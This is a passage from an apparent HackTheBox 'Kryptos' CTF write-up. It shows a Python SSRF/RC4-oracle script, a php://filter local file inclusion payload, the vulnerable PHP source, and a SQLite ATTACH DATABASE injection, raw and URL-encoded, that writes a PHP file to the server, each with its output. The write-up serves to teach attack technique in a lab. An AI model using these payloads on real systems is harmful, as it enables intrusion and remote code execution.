class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line">N = <span class="number">1</span></span><br><span class="line">cookies = &#123;<span class="string">"PHPSESSID"</span> : <span class="string">"99ub5git6oc7mka23ibjdorla2"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(url)</span>:</span></span><br><span class="line">	params = &#123;<span class="string">'cipher'</span> : <span class="string">'RC4'</span>,<span class="string">'url'</span> : url&#125;</span><br><span class="line">	req = requests.get(<span class="string">"http://kryptos.htb/encrypt.php"</span>,params=params,cookies=cookies)</span><br><span class="line">	response = req.text</span><br><span class="line">	start = <span class="string">"id=\"output\"&gt;"</span></span><br><span class="line">	end = <span class="string">"&lt;/textarea&gt;"</span></span><br><span class="line">	result = response[response.find(start)+len(start):response.rfind(end)]</span><br><span class="line">	<span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(filename)</span>:</span></span><br><span class="line">	url = <span class="string">"http://10.10.xx.xx/"</span> + filename <span class="comment"># replace this with your ip address</span></span><br><span class="line">	params = &#123;<span class="string">'cipher'</span> : <span class="string">'RC4'</span>,<span class="string">'url'</span> : url&#125;</span><br><span class="line">	req = requests.get(<span class="string">"http://kryptos.htb/encrypt.php"</span>,params=params,cookies=cookies)</span><br><span class="line">	response = req.text</span><br><span class="line">	start = <span class="string">"id=\"output\"&gt;"</span></span><br><span class="line">	end = <span class="string">"&lt;/textarea&gt;"</span></span><br><span class="line">	result = response[response.find(start)+len(start):response.rfind(end)]</span><br><span class="line">	result = b64decode(result)</span><br><span class="line">	<span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_file</span><span class="params">(data)</span>:</span></span><br><span class="line">	<span class="keyword">global</span> N</span><br><span class="line">	filename = <span class="string">"ENCRYPTED_"</span> + str(N)</span><br><span class="line">	data = b64decode(data)</span><br><span class="line">	<span class="keyword">with</span> open(filename,<span class="string">"wb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">		f.write(data)</span><br><span class="line">		f.close()</span><br><span class="line">	<span class="keyword">return</span> filename</span><br><span class="line"></span><br><span class="line">YELLOW = <span class="string">"\033[93m"</span></span><br><span class="line">GREEN = <span class="string">"\033[32m"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	url = input(GREEN + <span class="string">"[?] URL : "</span>)</span><br><span class="line">	<span class="keyword">if</span> url == <span class="string">"EXIT"</span> :</span><br><span class="line">		system(<span class="string">"rm ./ENCRYPTED_* &amp;&amp; rm ./OUTPUT_*"</span>)</span><br><span class="line">		exit()</span><br><span class="line">	result = decrypt(create_file(encrypt(url)))</span><br><span class="line">	outfile = <span class="string">"OUTPUT_"</span> + str(N)</span><br><span class="line">	<span class="keyword">with</span> open(outfile,<span class="string">"wb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">		f.write(result)</span><br><span class="line">		f.close()</span><br><span class="line">	print(YELLOW + <span class="string">"[*] Result :"</span>)</span><br><span class="line">	system(<span class="string">"cat ./"</span> + outfile)</span><br><span class="line">	N+=<span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>This script sends a request to <code>/encrypt.php</code> with the given <code>url</code>, then it retrieves the encrypted data and saves it in a file. It sends another request to <code>/encrypt.php</code> with the <code>url</code> to the encrypted file then it retrieves the decrypted data, saves it in a file then it prints it.<br>It saves encrypted files and decrypted files and names them according to this pattern : <code>ENCRYPTED_N</code>, <code>OUTPUT_N</code> where <code>N</code> is a number which is incremented by 1 every request.<br>I created a directory and called it <code>ssrf</code>, I ran a python server there then I ran my script :<br><img src="/images/hackthebox/kryptos/16.png" alt=""><br><code>/dev</code> :</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[?] URL : http://127.0.0.1/dev/</span><br><span class="line">[*] Result :</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"menu"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"index.php"</span>&gt;</span>Main Page<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"index.php?view=about"</span>&gt;</span>About<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"index.php?view=todo"</span>&gt;</span>ToDo<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>I went to <code>/dev/index.php?view=todo</code> and I found some interesting stuff :</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[?] URL : http://127.0.0.1/dev/index.php?view=todo</span><br><span class="line">[*] Result :</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"menu"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"index.php"</span>&gt;</span>Main Page<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"index.php?view=about"</span>&gt;</span>About<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"index.php?view=todo"</span>&gt;</span>ToDo<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>ToDo List:<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">1) Remove sqlite_test_page.php</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span>2) Remove world writable folder which was used for sqlite testing</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span>3) Do the needful</span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span> Done: <span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">1) Restrict access to /dev</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span>2) Disable dangerous PHP functions</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>There were 2 “done” things in this todo list : restricting access to <code>/dev</code> and disabling dangerous <code>php</code> functions which will be a problem if we could somehow upload/write files. However the things that haven’t been done yet were removing a <code>php</code> page called <code>sqlite_test_page.php</code> and removing a folder writable by everyone which was used for <code>sqlite</code> testing, probably used by the <code>sqlite_test_page.php</code><br>I went to <code>/dev/sqlite_test_page.php</code> but I only got an empty <code>html</code> page :</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[?] URL : http://127.0.0.1/dev/sqlite_test_page.php</span><br><span class="line">[*] Result :</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h2 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h2><p>As we saw, <code>/dev/index.php</code> had a parameter called <code>view</code> which was used to view other pages, There was a possible local file inclusion vulnerability here so I tested on <code>/index.php</code> and it worked :</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">[?] URL : http://127.0.0.1/dev/index.php?view=../index    </span><br><span class="line">[*] Result :</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"menu"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"index.php"</span>&gt;</span>Main Page<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"index.php?view=about"</span>&gt;</span>About<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"index.php?view=todo"</span>&gt;</span>ToDo<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Cryptor Login<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"css/bootstrap.min.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container-fluid"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Cryptor Login<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">""</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"Username"</span>&gt;</span>Username:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">id</span>=<span class="string">"username"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">placeholder</span>=<span class="string">"Enter username"</span>&gt;</span>                                                                                                         </span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"password"</span>&gt;</span>Password:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">id</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">placeholder</span>=<span class="string">"Enter password"</span>&gt;</span>                                                                                                     </span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">id</span>=<span class="string">"db"</span> <span class="attr">name</span>=<span class="string">"db"</span> <span class="attr">value</span>=<span class="string">"cryptor"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"token"</span> <span class="attr">value</span>=<span class="string">"66fc3775dd9b849f2522417e51bd12cffc0e0196a7deb43b1cd9756b65d09e91"</span> /&gt;</span>                                                                                                 </span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span> <span class="attr">name</span>=<span class="string">"login"</span>&gt;</span>Submit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>I wanted to read the <code>php</code> code of <code>sqlite_test_page.php</code> to know what’s in there so I tried the <code>php://filter/convert.base64-encode</code> wrapper (got it from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion" target="_blank" rel="noopener">here</a>) and it worked :</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[?] URL : http://127.0.0.1/dev/index.php?view=php://filter/convert.base64-encode/resource=sqlite_test_page</span><br><span class="line">[*] Result :</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"menu"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"index.php"</span>&gt;</span>Main Page<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"index.php?view=about"</span>&gt;</span>About<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"index.php?view=todo"</span>&gt;</span>ToDo<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">PGh0bWw+CjxoZWFkPjwvaGVhZD4KPGJvZHk+Cjw/cGhwCiRub19yZXN1bHRzID0gJF9HRVRbJ25vX3Jlc3VsdHMnXTsKJGJvb2tpZCA9ICRfR0VUWydib29raWQnXTsKJHF1ZXJ5ID0gIlNFTEVDVCAqIEZST00gYm9va3MgV0hFUkUgaWQ9Ii4kYm9va2lkOwppZiAoaXNzZXQoJGJvb2tpZCkpIHsKICAgY2xhc3MgTXlEQiBleHRlbmRzIFNRTGl0ZTMKICAgewogICAgICBmdW5jdGlvbiBfX2NvbnN0cnVjdCgpCiAgICAgIHsKCSAvLyBUaGlzIGZvbGRlciBpcyB3b3JsZCB3cml0YWJsZSAtIHRvIGJlIGFibGUgdG8gY3JlYXRlL21vZGlmeSBkYXRhYmFzZXMgZnJvbSBQSFAgY29kZQogICAgICAgICAkdGhpcy0+b3BlbignZDllMjhhZmNmMGIyNzRhNWUwNTQyYWJiNjdkYjA3ODQvYm9va3MuZGInKTsKICAgICAgfQogICB9CiAgICRkYiA9IG5ldyBNeURCKCk7CiAgIGlmKCEkZGIpewogICAgICBlY2hvICRkYi0+bGFzdEVycm9yTXNnKCk7CiAgIH0gZWxzZSB7CiAgICAgIGVjaG8gIk9wZW5lZCBkYXRhYmFzZSBzdWNjZXNzZnVsbHlcbiI7CiAgIH0KICAgZWNobyAiUXVlcnkgOiAiLiRxdWVyeS4iXG4iOwoKaWYgKGlzc2V0KCRub19yZXN1bHRzKSkgewogICAkcmV0ID0gJGRiLT5leGVjKCRxdWVyeSk7CiAgIGlmKCRyZXQ9PUZBTFNFKQogICAgewoJZWNobyAiRXJyb3IgOiAiLiRkYi0+bGFzdEVycm9yTXNnKCk7CiAgICB9Cn0KZWxzZQp7CiAgICRyZXQgPSAkZGItPnF1ZXJ5KCRxdWVyeSk7CiAgIHdoaWxlKCRyb3cgPSAkcmV0LT5mZXRjaEFycmF5KFNRTElURTNfQVNTT0MpICl7CiAgICAgIGVjaG8gIk5hbWUgPSAiLiAkcm93WyduYW1lJ10gLiAiXG4iOwogICB9CiAgIGlmKCRyZXQ9PUZBTFNFKQogICAgewoJZWNobyAiRXJyb3IgOiAiLiRkYi0+bGFzdEVycm9yTXNnKCk7CiAgICB9CiAgICRkYi0+Y2xvc2UoKTsKfQp9Cj8+CjwvYm9keT4KPC9odG1sPgo=<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h2 id="SQLI-–-gt-Arbitrary-File-Write"><a href="#SQLI-–-gt-Arbitrary-File-Write" class="headerlink" title="SQLI –&gt; Arbitrary File Write"></a>SQLI –&gt; Arbitrary File Write</h2><p><code>sqlite_test_page.php</code> :</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$no_results = $_GET[<span class="string">'no_results'</span>];</span><br><span class="line">$bookid = $_GET[<span class="string">'bookid'</span>];</span><br><span class="line">$query = <span class="string">"SELECT * FROM books WHERE id="</span>.$bookid;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($bookid)) &#123;</span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">MyDB</span> <span class="keyword">extends</span> <span class="title">SQLite3</span></span></span><br><span class="line"><span class="class">   </span>&#123;</span><br><span class="line">      <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">	 <span class="comment">// This folder is world writable - to be able to create/modify databases from PHP code</span></span><br><span class="line">         <span class="keyword">$this</span>-&gt;open(<span class="string">'d9e28afcf0b274a5e0542abb67db0784/books.db'</span>);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   $db = <span class="keyword">new</span> MyDB();</span><br><span class="line">   <span class="keyword">if</span>(!$db)&#123;</span><br><span class="line">      <span class="keyword">echo</span> $db-&gt;lastErrorMsg();</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"Opened database successfully\n"</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"Query : "</span>.$query.<span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($no_results)) &#123;</span><br><span class="line">   $ret = $db-&gt;exec($query);</span><br><span class="line">   <span class="keyword">if</span>($ret==<span class="keyword">FALSE</span>)</span><br><span class="line">    &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"Error : "</span>.$db-&gt;lastErrorMsg();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">   $ret = $db-&gt;query($query);</span><br><span class="line">   <span class="keyword">while</span>($row = $ret-&gt;fetchArray(SQLITE3_ASSOC) )&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"Name = "</span>. $row[<span class="string">'name'</span>] . <span class="string">"\n"</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span>($ret==<span class="keyword">FALSE</span>)</span><br><span class="line">    &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"Error : "</span>.$db-&gt;lastErrorMsg();</span><br><span class="line">    &#125;</span><br><span class="line">   $db-&gt;close();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>It takes two parameters : <code>no_results</code> and <code>bookid</code> :</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$no_results = $_GET[<span class="string">'no_results'</span>];</span><br><span class="line">$bookid = $_GET[<span class="string">'bookid'</span>];</span><br></pre></td></tr></table></figure>
<p>And it appends <code>bookid</code> to a <code>sqlite</code> query without any filtering : </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"SELECT * FROM books WHERE id="</span>.$bookid;</span><br></pre></td></tr></table></figure>
<p>We also can see the name of the writable directory <code>d9e28afcf0b274a5e0542abb67db0784</code> :</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// This folder is world writable - to be able to create/modify databases from PHP code</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;open(<span class="string">'d9e28afcf0b274a5e0542abb67db0784/books.db'</span>);</span><br></pre></td></tr></table></figure>
<p>With this <code>SQL</code> injection and the name of a writable directory, we can use the <code>SQLite</code> command <code>Attach Database</code> to write files (got it from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md" target="_blank" rel="noopener">here</a>).<br>I tried a test file first so the payload was like this :</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;ATTACH DATABASE 'd9e28afcf0b274a5e0542abb67db0784/test.php' AS test;<span class="keyword">CREATE</span> <span class="keyword">TABLE</span> test.pwn (dataz <span class="built_in">text</span>);<span class="keyword">INSERT</span> <span class="keyword">INTO</span> test.pwn (dataz) <span class="keyword">VALUES</span> (<span class="string">'&lt;?php echo "test" ?&gt;'</span>);</span><br></pre></td></tr></table></figure>
<p>First attempt failed apparently because of encoding issues so I <code>url</code>-encoded the payload and tried again:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[?] URL : http://127.0.0.1/dev/sqlite_test_page.php?no_results=FALSE&amp;bookid=%31%3b%41%54%54%41%43%48%20%44%41%54%41%42%41%53%45%20%27%64%39%65%32%38%61%66%63%66%30%62%32%37%34%61%35%65%30%35%34%32%61%62%62%36%37%64%62%30%37%38%34%2f%74%65%73%74%2e%70%68%70%27%20%41%53%20%74%65%73%74%3b%43%52%45%41%54%45%20%54%41%42%4c%45%20%74%65%73%74%2e%70%77%6e%20%28%64%61%74%61%7a%20%74%65%78%74%29%3b%49%4e%53%45%52%54%20%49%4e%54%4f%20%74%65%73%74%2e%70%77%6e%20%28%64%61%74%61%7a%29%20%56%41%4c%55%45%53%20%28%27%3c%3f%70%68%70%20%65%63%68%6f%20%22%74%65%73%74%22%20%3f%3e%27%29%3b</span><br><span class="line">[*] Result :</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">Opened database successfully</span><br><span class="line">Query : SELECT * FROM books WHERE id=1;ATTACH DATABASE 'd9e28afcf0b274a5e0542abb67db0784/test.php' AS test;CREATE TABLE test.pwn (dataz text);INSERT INTO test.pwn (dataz) VALUES ('<span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">"test"</span> <span class="meta">?&gt;</span></span>');</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>The file was successfully created :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[?] URL : http:&#x2F;&#x2F;127.0.0.1&#x2F;dev&#x2F;d9e28afcf0b274a5e0542abb67db0784&#x2F;test.php</span><br><span class="line">[*] Result :</span><br><span class="line">test</span><br></pre></td></tr></table></figure>


<h2 id="Arbitrary-File-Read"><a href="#Arbitrary-File-Read" class="headerlink" title="Arbitrary File Read"></a>Arbitrary File Read</h2><p>We know that dangerous <code>php</code> functions are disabled, but let’s check which functions are exactly disabled, I overwrote my <code>test.php</code> file and made it call <code>phpinfo()</code> instead of printing <code>test</code> :</p>
